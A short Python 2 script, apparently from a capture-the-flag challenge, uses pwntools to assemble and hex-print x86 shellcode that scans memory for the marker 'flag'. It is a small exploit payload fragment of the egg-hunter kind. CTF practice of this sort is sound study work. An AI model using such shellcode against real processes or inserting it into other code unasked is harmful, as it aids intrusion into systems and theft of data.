from pwn import *

flag = u32('flag')

print asm("""
dec ecx
mov eax, %(flag)d
repne scasd
sub edi, 4
""" % locals()).encode("hex")


